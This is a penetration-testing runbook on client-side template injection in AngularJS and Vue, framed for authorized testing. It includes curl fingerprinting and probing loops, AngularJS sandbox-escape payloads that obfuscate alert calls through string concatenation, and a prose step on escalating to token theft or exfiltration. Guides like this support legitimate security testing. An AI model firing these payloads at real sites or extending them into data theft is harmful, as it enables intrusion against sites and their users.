---
title: "Client-Side Template Injection (CSTI)"
description: "Injecting template expressions into AngularJS, Vue, and similar client frameworks, escaping sandboxes, and escalating to XSS in authorized tests."
phase: Web
order: 18
tags:
  - csti
  - xss
  - client-side
  - angularjs
tools:
  - curl
  - burp suite
updated: 2026-10-01
---

A runbook for authorized CSTI testing on **in-scope** targets. Goal: confirm user input is compiled as a template expression, escape the framework sandbox, and demonstrate script execution.

## 1. Fingerprint the client framework

```bash
curl -s https://target/ | grep -oiE 'ng-app|angular[.a-z-]*|vue[.a-z-]*|knockout|handlebars' | sort -u

# Look for the version specifically
curl -s https://target/ | grep -oiE 'angular(\.min)?\.js[^"]*|vue@[0-9.]+|vue\.min\.js[^"]*'
```

AngularJS 1.x with `ng-app` and `{{ }}`, or Vue with client-side compilation, are the usual homes. Rich text, search highlighting, and live-preview features are common sinks.

## 2. Send arithmetic probes

Reflect a simple expression and see whether the app evaluates it.

```bash
curl -s "https://target/search?q={{7*7}}" | grep -o '49'
curl -s "https://target/search?q=\${7*7}" | grep -o '49'
curl -s "https://target/search?q=#{7*7}" | grep -o '49'
```

`{{7*7}}` returning `49`, or `{{7*'7'}}` returning `7777777` (Angular) vs `49` (Twig), confirms evaluation rather than mere reflection.

## 3. Evaluate an expression in the DOM

For AngularJS, a direct call probe:

```
{{constructor.constructor('alert(1)')()}}
```

Observe the rendered page in DevTools — a reflected-but-unescaped string is not CSTI; it must actually evaluate.

## 4. Escalate per framework

- **AngularJS 1.x**: expressions can call functions; older versions allow sandbox escapes reaching `alert`/`eval`.
- **Vue**: `v-html` runs HTML but not expressions by default; template compilation with user input can.

Document the exact version — escapes are version-specific and the Angular sandbox was removed in later releases.

## 5. Build sandbox escapes from pieces

When a filter blocks dangerous tokens, assemble them at runtime.

```js
// string concatenation and constructor walking
{{('').constructor.constructor('ale'+'rt(1)')()}}
{{'a'.constructor.prototype.charAt}}
{{$eval("ale"+"rt(1)")}}
```

Also try `$apply`, `assign`, and `toString().constructor` to reach `Function` without a literal `eval`.

## 6. Escalate to XSS

Once expression execution is confirmed, show impact: read tokens, perform an authenticated request, or exfiltrate to a host you control. Keep the final payload minimal and non-destructive.

## Full pipeline

```bash
# 1. Fingerprint framework + version
curl -s https://target/ | grep -oiE 'ng-app|angular(\.min)?\.js[^"]*|vue@[0-9.]+'

# 2. Arithmetic probes through candidate parameters
for p in q search name; do
  curl -s "https://target/?$p={{7*7}}" | grep -q '49' && echo "CSTI on $p"
done

# 3. Direct evaluation probe (inspect the rendered DOM in DevTools)
curl -s "https://target/search?q={{constructor.constructor('alert(1)')()}}"

# 4. Reduce to a minimal sandbox escape and confirm execution
curl -s "https://target/search?q={{('').constructor.constructor('ale'+'rt(1)')()}}"
```

## Ethics & legality

- Only test targets in an official scope or with written authorization.
- Never deploy session-stealing payloads against real users; prove execution with a harmless alert on your own session.
- Record the framework version, the exact input, and the evaluated output as evidence.
